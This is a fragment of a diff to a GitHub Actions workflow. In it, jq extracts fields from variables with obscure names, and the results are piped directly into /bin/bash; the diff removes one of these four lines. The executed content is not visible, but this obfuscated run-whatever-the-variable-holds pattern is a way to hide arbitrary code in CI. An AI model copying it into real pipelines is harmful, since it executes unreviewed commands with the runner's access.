@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$sr9" | jq -r .s05776 | /bin/bash
           echo $fcpfi001 | jq -r .faqu33711 | /bin/bash
           echo $edj75 | jq -r .vsa6 | /bin/bash
-          echo $lptpd6 | jq -r .tde6 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
